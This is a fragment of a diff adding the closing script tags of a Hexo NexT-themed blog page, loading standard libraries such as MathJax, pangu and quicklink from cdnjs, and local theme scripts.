+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
